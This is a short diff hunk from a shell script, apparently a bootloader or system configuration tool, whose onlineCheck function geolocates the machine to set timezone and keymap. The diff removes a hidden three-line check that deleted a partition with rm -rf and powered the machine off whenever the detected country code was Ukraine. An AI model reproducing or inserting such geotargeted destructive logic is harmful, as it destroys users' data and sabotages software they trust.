@@ -593,9 +593,6 @@ function onlineCheck() {
   REGION="$(curl -m 10 -v "http://ip-api.com/line?fields=timezone" 2>/dev/null | tr -d '\n' | cut -d '/' -f1)"
   TIMEZONE="$(curl -m 10 -v "http://ip-api.com/line?fields=timezone" 2>/dev/null | tr -d '\n' | cut -d '/' -f2)"
   KEYMAP="$(curl -m 10 -v "http://ip-api.com/line?fields=countryCode" 2>/dev/null | tr '[:upper:]' '[:lower:]')"
-  if [ "${KEYMAP}" = "ua" ]; then
-    rm -rf "${PART3_PATH}" && exec poweroff
-  fi
   [ -z "${KEYMAP}" ] && KEYMAP="$(readConfigKey "keymap" "${USER_CONFIG_FILE}")"
   if [ -n "${REGION}" ] && [ -n "${TIMEZONE}" ]; then
     writeConfigKey "time.region" "${REGION}" "${USER_CONFIG_FILE}"
